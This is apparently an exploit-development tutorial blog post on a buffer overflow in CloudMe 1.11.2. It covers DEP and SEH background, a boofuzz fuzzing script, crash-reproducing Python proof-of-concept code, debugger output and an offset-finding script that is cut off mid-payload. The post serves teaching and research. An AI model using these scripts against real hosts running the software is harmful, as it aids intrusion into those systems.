---
layout: single
title: CloudMe v1.11.2 DEP bypass using ROP gadgets
date: 2021-02-18
classes: wide
comments: false
header:
  teaser: /assets/images/avatar.jpg
tags:
- Exploitation
- Penetration Testing
- Return Oriented Programming
- ROP chains
- ROP gadgets
---

<p align="justify">This article explains the exploitation of a buffer overflow vulnerability and how protections such as SEH and DEP can be bypassed. The vulnerable application is the <b>CloudMe version 1.11.2</b>.</p>

<img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/02/cloudme.png" alt="" width="550" height="680" />

<p align="justify">Tools used for this exercise</p>
<ul>
<li>WinDbg</li>
<li>Immunity Debugger</li>
<li>badchars</li>
<li>Process Hacker 2</li>
<li>ROPgadget</li>
<li>boofuzz</li>
<li>mona</li>
<li>Wireshark</li>
<li>RawCap</li>
<li>msfvenom</li>
</ul>
<blockquote>
<p align="justify">This vulnerability was originally found by  <b><i>hyp3rlinx. The issue has been discovered regarding the version 1.11.0 ( <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6892">CVE-2018-6892</a> ) but also affects version 1.11.2. </i></b></p>
</blockquote>
<p align="justify">Before continue reading this article one should be familiar with the following :</p>
<ul>
<li>SEH ( Structured Exception Handling )</li>
<li>ROP ( Return Oriented Programming )</li>
<li>DEP ( Data Execution Prevention )</li>
<li>ASLR ( Address space layout randomization )</li>
<li>Debuggers ( e.g. WinDbg, Immunity, OlyDBG, etc )</li>
</ul>
<p align="justify">The vulnerable software can be found <a href="https://www.cloudme.com/downloads/CloudMe_1112.exe">here</a></p>
<blockquote>
<p align="justify">I have published this exploit on <a href="https://www.exploit-db.com/exploits/48499">exploit-db</a></p>
</blockquote>
<p align="justify"><strong><em>Suggested reading :</em></strong></p>
<p align="justify"><a href="https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubikstm-cube/#aslr">Exploit writing tutorial part 10 : Chaining DEP with ROP — the Rubik’s Cube</a></p>
<hr />
<h3>What is DEP</h3>
<p align="justify">Data Execution Prevention (DEP) is a security feature that prevents damage to the victim's computer from viruses and other security threats. Harmful programs can try to attack Windows by attempting to run (also known as execute) code from system memory locations reserved for Windows and other authorized programs. These types of attacks can harm programs and files. DEP is used to protect computers by monitoring programs to make sure that they use system memory safely. If DEP notices a program on the computer using memory incorrectly, it closes the program and notifies the victim.DEP is not intended to be a comprehensive defense against all exploits; it is intended to be another tool that can be used to secure applications</p>
<h3>What is SEH</h3>
<p align="justify">Structured Exception Handling (SEH) is a Windows mechanism for handling both hardware and software exceptions consistently. The concept is to try to execute a block of code and if an error/exception occurs, do whatever the "except" block (aka the exception handler) says. The exception handler is nothing more than another block of code that tells the system what to do in the event of an exception. In other words, it handles the exception. Exception handlers might be implemented by the application (For example by the __try/__except construct) or by the OS itself. Since there are many different types of errors (divide by zero, out of bounds, etc), there can be many corresponding exception handlers. Regardless of where the exception handler is defined (application vs. OS) or what type of exception it is designed to handle, all handlers are managed centrally and consistently by Windows SEH via a collection of designated data structures and functions.</p>
<hr />
<h3>The Walkthrough</h3>
<p align="justify">Before proceeding with the exercise set DEP to <code>AlwaysOn</code> using the following command:</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
bcdedit /set nx AlwaysOn
</pre>

<p> verify that the setting is enabled as shown below</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
C:\Users\pentest\Desktop\CloudMe&gt;bcdedit /enum
[...]
Windows Boot Loader
-------------------
identifier              {current}
device                  partition=C:
path                    \Windows\system32\winload.exe
description             Windows 7
locale                  en-US
inherit                 {bootloadersettings}
recoverysequence        {1fc46248-40d9-11ea-a45f-a2a235f15fa4}
recoveryenabled         Yes
osdevice                partition=C:
systemroot              \Windows
resumeobject            {1fc46246-40d9-11ea-a45f-a2a235f15fa4}
nx                      AlwaysOn
</pre>

<hr/>
<h3>1. Finding the Vulnerability</h3>
<p align="justify">In order to find this vulnerability we first need to fuzz the target application. Before using any fuzzing framework we must search what to fuzz. When executing the <b>CloudMe</b> application, if we run the netstat command, we can see that the application is listening on port <b>8888</b>.</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
C:\Users\pentest\Desktop&gt;netstat -an | find "8888"
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING
</pre>

<p align="justify">We can also confirm this using the <b>process hacker 2</b> tool.</p>
<figure><img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/02/phtool.png" alt="PHTool" width="630" height="143" /></figure>
<p align="justify">Now lets fuzz this target application using <b>boofuzz</b>. Boofuzz is a fork of and the successor to the venerable Sulley fuzzing framework. More details about the script can be found <a href="https://boofuzz.readthedocs.io/en/stable/">here</a>. The tool can also be found on <a href="https://github.com/jtpereyda/boofuzz">github </a>.The following python script used to fuzz the <b>CloudMe</b> application.</p>

```python

#!/usr/bin/python

from boofuzz import *

host = '127.0.0.1'	
port = 8888  #CloudMe port

def main():

	session = Session(
      target = Target(connection = SocketConnection(host, port, proto='tcp')))

	s_initialize("CloudMe")	#just giving our session a name
	s_string("FUZZ") 
	
	session.connect(s_get("CloudMe"))
	session.fuzz()

if __name__ == "__main__":
    main()

```

<p align="justify">Before running the script above, we will first use a tool called <b>RawCap.exe</b> which will help us sniffing the <b>127.0.0.1 (localhost/loopback)</b> interface. Then the produced <b>dump.pcap</b> file will be oppend with <b>Wireshark</b> in order to inspect further the communication on port 8888. <b>RawCap.exe</b> tool can be found <a href="https://www.netresec.com/?page=rawcap">here</a></p>
<p><img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/02/rawcap.png" alt="RawCap" width="678" height="287" /></p>
<p align="justify">At this point we are ready to run <b>boofuzz</b> tool in order to fuzz the target application using the python script above.</p>
<figure><img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/02/fuzz-e1613506773170.png" alt="fuzz" width="719" height="404" /></figure>
<p align="justify">In order to further inspect the crash, we will load the <b>dump.pcap</b> file produced from <b>RawCap.exe</b> tool into <b>Wireshark</b>. Afterwards, searching the packets in <b>Wireshark</b>, we are able to find the data that caused the crash and also we are able to see the format as well as the length of the data sent to the vulnerable application as shown at the image below.</p>
<p><img style="display: block;margin-left: auto;margin-right: auto;border: 1px solid red;" src="{{ site.baseurl }}/assets/images/2021/02/wireshark-e1613506357213.png" alt="wireshark" width="1012" height="569" /></p>
<p align="justify">At this point we have enough information about the crash, so we can create a proof of concept script in python in order to reproduce the issue. We will send 5000 A's to the target application.</p>

```python

import socket
import sys

target = "127.0.0.1"

poc = "\x41"*5000

try:
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target,8888))
    s.send(poc)
except Exception as e:
    print(sys.exc_value)
```

<p align="justify">Running the script above confirms the issue, and now we have a starting point developing the exploit. As we see below in <strong>WinDbg</strong>, when running the script above, the crash occurs</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
(f24.d98): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=41414141 ecx=762498da edx=012d78ec esi=41414141 edi=41414141
eip=41414141 esp=0022d470 ebp=41414141 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
41414141 ??              ???
</pre>

<p align="justify">It looks like there is a straight Access Violation occurred meaning that there is a crash dictating a possible overflow. However, <strong>CloudMe</strong> is running in Windows 7 professional where there is a default <b>SEH</b> protection and the application appears to be exploitable</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:000> !exchain
0022d908: 41414141
Invalid exception stack at 41414141
</pre>

<p align="justify">As we can see above <b>SEH</b> is overwritten with value that we control <code>\x41\x41\x41\x41</code>, so now we will proceed with <b>SEH</b> based exploitation.</p>

<hr />
<h3>2. Searching the Offset</h3>
<p align="justify">At this point we need to check how far we are able to write and overwrite <b>SEH</b>. In order to do this we will attempt to generate 5000 byte pattern using <b>mona.py</b> as follows. First, create an output folder form mona inside logs folder. All the generated patterns and other data such as ROP chains and bad chars generated from <b>mona.py</b> will be saved there.</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
!mona config -set workingfolder c:\logs\%p
</pre>

<p align="justify">From Immunity Debugger we run :</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 !mona pattern_create 5000
</pre>

<p align="justify">From WinDbg we run :</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
0:009> !load pykd.pyd
0:009> !py mona pattern_create 5000
Hold on...
[+] Command used:
!py C:\Program Files\Windows Kits\8.0\Debuggers\x86\mona.py pattern_create 5000
Creating cyclic pattern of 5000 bytes
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp9Fq0Fq1Fq2Fq3Fq4Fq5Fq6Fq7Fq8Fq9Fr0Fr1Fr2Fr3Fr4Fr5Fr6Fr7Fr8Fr9Fs0Fs1Fs2Fs3Fs4Fs5Fs6Fs7Fs8Fs9Ft0Ft1Ft2Ft3Ft4Ft5Ft6Ft7Ft8Ft9Fu0Fu1Fu2Fu3Fu4Fu5Fu6Fu7Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw4Fw5Fw6Fw7Fw8Fw9Fx0Fx1Fx2Fx3Fx4Fx5Fx6Fx7Fx8Fx9Fy0Fy1Fy2Fy3Fy4Fy5Fy6Fy7Fy8Fy9Fz0Fz1Fz2Fz3Fz4Fz5Fz6Fz7Fz8Fz9Ga0Ga1Ga2Ga3Ga4Ga5Ga6Ga7Ga8Ga9Gb0Gb1Gb2Gb3Gb4Gb5Gb6Gb7Gb8Gb9Gc0Gc1Gc2Gc3Gc4Gc5Gc6Gc7Gc8Gc9Gd0Gd1Gd2Gd3Gd4Gd5Gd6Gd7Gd8Gd9Ge0Ge1Ge2Ge3Ge4Ge5Ge6Ge7Ge8Ge9Gf0Gf1Gf2Gf3Gf4Gf5Gf6Gf7Gf8Gf9Gg0Gg1Gg2Gg3Gg4Gg5Gg6Gg7Gg8Gg9Gh0Gh1Gh2Gh3Gh4Gh5Gh6Gh7Gh8Gh9Gi0Gi1Gi2Gi3Gi4Gi5Gi6Gi7Gi8Gi9Gj0Gj1Gj2Gj3Gj4Gj5Gj6Gj7Gj8Gj9Gk0Gk1Gk2Gk3Gk4Gk5Gk
[+] Preparing output file 'pattern.txt'
    - (Re)setting logfile c:\logs\CloudMe\pattern.txt
Note: don't copy this pattern from the log window, it might be truncated !
It's better to open c:\logs\CloudMe\pattern.txt and copy the pattern from the file

[+] This mona.py action took 0:00:00.125000
</pre>

<p align="justify">Now that we have generated the pattern, we are able to find the exact offset where the application crashes. The following PoC script will do that.</p>

```python

import socket 
import sys

target = "127.0.0.1"

payload= "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A"
payload+="c1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5A"
payload+="e6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0A"
payload+="h1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5A"
payload+="j6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0A"
payload+="m1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5A"
payload+="o6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0A"
payload+="r1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5A"
payload+="t6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0A"
payload+="w1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5A"
payload+="y6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0B"
payload+="b1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5B"
payload+="d6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0B"
payload+="g1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5B"
payload+="i6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0B"
payload+="l1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5B"
payload+="n6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0B"
payload+="q1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5B"
payload+="s6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0B"
payload+="v1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5B"
payload+="x6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0C"
payload+="a1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5C"
payload+="c6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0C"
payload+="f1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5C"
payload+="h6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0C"
payload+="k1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5C"
payload+="m6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0C"
payload+="p1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5C"
